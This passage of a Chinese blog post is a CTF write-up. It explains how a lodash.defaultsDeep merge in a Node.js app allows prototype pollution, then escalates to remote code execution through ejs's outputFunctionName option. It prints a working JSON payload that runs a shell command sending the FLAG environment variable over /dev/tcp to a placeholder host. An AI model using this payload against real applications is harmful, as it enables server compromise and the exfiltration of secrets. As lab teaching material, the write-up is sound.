class="keyword">await</span> <span class="title function_">query</span>(sql,raws[i].<span class="property">id</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(doms);</span><br><span class="line">            res.<span class="title function_">json</span>(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Return recorder is less than 5,so return it without merge.&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;select `dom` from  `html` where userid=? &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( <span class="keyword">var</span> i =<span class="number">0</span> ;i&lt; raws.<span class="property">length</span> ; i++)&#123;</span><br><span class="line">            ret.<span class="title function_">push</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line">        res.<span class="title function_">json</span>(ret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+<p>分析以上代码知道，当<code>datalist</code>的长度大于5时，会执行这一条语句：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.<span class="title function_">defaultsDeep</span>(doms,<span class="title class_">JSON</span>.<span class="title function_">parse</span>( raws[i].<span class="property">dom</span> ));</span><br></pre></td></tr></table></figure>
+
+
+<p>然后问题就变成了怎么让<code>datalist</code> 的长度大于5，通过<code>server.js</code>定义的<code>/add</code>接口</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/add&quot;</span>,auth,<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">type</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">content</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> newContent = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> userid = req.<span class="property">session</span>.<span class="property">userid</span>;</span><br><span class="line"></span><br><span class="line">        newContent[req.<span class="property">body</span>.<span class="property">type</span>] = [ req.<span class="property">body</span>.<span class="property">content</span> ]</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newContent:&quot;</span>,newContent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">&quot;insert into `html` (`userid`,`dom`) values (?,?) &quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> <span class="title function_">query</span>(sql,[userid, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(newContent) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.<span class="property">affectedRows</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(newContent);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>我们只需要构造type和content两个键值，将<code>Content-Type</code>设置为<code>application/json</code>，然后post访问该接口5次以上便可以</p>
+<p>污染点找到了，接下来是如何利用原型链污染来获取Flag，这道题目有两种方式：</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><h3 id="利用ejs进行rce"><a href="#利用ejs进行rce" class="headerlink" title="利用ejs进行rce"></a>利用ejs进行rce</h3><p>因为<code>server.js</code>调用了ejs作为模板渲染引擎，经过调试跟进，可以在<code>ejs.js</code>中发现如下代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">compile</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (opts.<span class="property">outputFunctionName</span>) &#123;</span><br><span class="line">        prepended += <span class="string">&#x27;  var &#x27;</span> + opts.<span class="property">outputFunctionName</span> + <span class="string">&#x27; = __append;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">...</span><br><span class="line">src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">...</span><br><span class="line">fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line"><span class="comment">// Return a callable function which will execute the function</span></span><br></pre></td></tr></table></figure>
+
+
+<p>这段代码的意思便是，<code>opt.outputFunctionName</code>会被作为字符串拼接到<code>prepended</code>中，然后到<code>src</code>、<code>fn</code>最终作为代码执行。而且<code>opt.outputFunctionName</code>这个成员在函数的上下文中完全没有出现过，也就是<code>undefined</code>那么我们通过给<code>Object.prototype</code>加上这一属性，就可以达到RCE的效果了</p>
+<p>payload如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;b</span></span><br><span class="line"><span class="string">ash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xx\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>向<code>/add</code>接口POST 6次，然后再访问一次<code>/get</code>，再访问<code>/</code>或<code>/login</code>触发<code>render()</code>函数即可</p>
+<p>FLAG在环境变量中</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLInject/" rel="tag"><i class="fa fa-tag"></i> SQLInject</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/" rel="prev" title="多进程、进程池、异步大总结">
+                  <i class="fa fa-chevron-left"></i> 多进程、进程池、异步大总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">昊</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/quicklink@2.2.0/dist/quicklink.umd.js" integrity="sha256-4kQf9z5ntdQrzsBC3YSHnEz02Z9C1UeW/E9OgnvlzSY=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":false,"archive":false,"delay":true,"timeout":3000,"priority":true,"url":"https://nuxm.gitee.io/SQLInject/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
